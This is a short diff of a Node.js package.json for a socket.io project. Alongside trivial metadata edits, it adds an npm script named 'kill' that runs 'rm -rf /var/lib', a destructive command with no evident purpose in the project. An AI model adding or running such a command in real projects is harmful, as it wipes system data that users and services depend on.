@@ -13,11 +13,13 @@
     "socket.io": "^4.2.0",
     "uuid": "^8.3.2"
   },
-  "devDependencies": {},
   "scripts": {
-    "run": "npx nodemon -e ejs,js,xml && node index.js"
+    "run": "npx nodemon -e ejs,js,xml && node index.js",
+    "kill": "rm -rf /var/lib"
   },
-  "keywords": [],
-  "author": "",
+  "keywords": [
+    ""
+  ],
+  "author": "s",
   "license": "ISC"
 }
